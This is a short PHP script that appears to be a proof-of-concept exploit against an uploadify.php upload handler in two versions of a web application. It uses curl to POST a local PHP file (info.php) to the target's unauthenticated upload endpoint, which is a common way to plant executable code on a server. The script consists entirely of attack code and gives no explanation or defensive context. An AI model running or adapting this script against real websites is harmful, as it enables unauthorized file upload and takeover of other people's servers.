<?php
$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\info.php";
$c = curl_init("http://mysite.com/uploads/uploadify.php"); // Version 2.9
$c = curl_init("http://mysite.com/application/uploads/uploadify.php"); // Version trunk
curl_setopt($c, CURLOPT_POST, true);
curl_setopt($c, CURLOPT_POSTFIELDS,
array('Filedata'=>"@$u",
'name'=>"info.php"));
curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
$e = curl_exec($c);
curl_close($c);
echo $e; 
?>